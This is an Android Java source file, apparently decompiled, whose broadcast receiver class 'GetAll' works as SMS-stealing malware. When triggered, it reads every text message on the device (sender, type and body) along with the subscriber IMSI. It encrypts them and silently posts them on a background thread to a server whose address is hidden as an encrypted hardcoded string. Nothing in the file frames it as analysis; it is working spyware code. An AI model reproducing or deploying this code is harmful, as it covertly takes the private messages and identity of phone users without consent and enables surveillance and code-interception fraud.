package com.dsifakf.aoakmnq;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;

public class GetAll extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        TelephonyManager TelManager = (TelephonyManager) context.getSystemService("phone");
        Secure parse = new Secure();
        String addr = null;
        String PostBody = "";
        String devimsi = null;
        Cursor cur = context.getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
        while (cur.moveToNext()) {
            String tp = cur.getString(cur.getColumnIndex("type"));
            String adr = cur.getString(cur.getColumnIndex("address"));
            PostBody = new StringBuilder(String.valueOf(PostBody)).append("<v><g>").append(adr).append("</g><f>").append(tp).append("</f><m>").append(cur.getString(cur.getColumnIndexOrThrow("body"))).append("</m></v>").toString();
        }
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
        try {
            devimsi = Secure.bytesToHex(parse.encrypt(TelManager.getSubscriberId()));
            String addr2 = new String(parse.decrypt(preferences.getString("ab", "6e8fa676e42c9bceb6624fb7601a67d0cc0eceeb0218283614342ac69ade50775488a2f64e4d5f5dd2fc5f602c921176")));
            try {
                PostBody = Secure.bytesToHex(parse.encrypt(Uri.encode(PostBody.replaceAll("[\r\n]", ""))));
                addr = addr2;
            } catch (Exception e) {
                addr = addr2;
            }
        } catch (Exception e2) {
        }
        HttpClient httpclient = new DefaultHttpClient();
        HttpPost httpPost = new HttpPost(addr);
        StringEntity strEntity = null;
        try {
            strEntity = new StringEntity("1=" + devimsi + "&3=" + PostBody);
        } catch (UnsupportedEncodingException e3) {
        }
        httpPost.setEntity(strEntity);
        httpPost.setHeader("Accept", "*/*");
        httpPost.setHeader("Content-Type", "application/x-www-form-urlencoded");
        final HttpClient httpClient = httpclient;
        final HttpPost httpPost2 = httpPost;
        new Thread(new Runnable() {
            public void run() {
                try {
                    httpClient.execute(httpPost2);
                } catch (IOException | Exception | ClientProtocolException e) {
                }
            }
        }).start();
    }
}
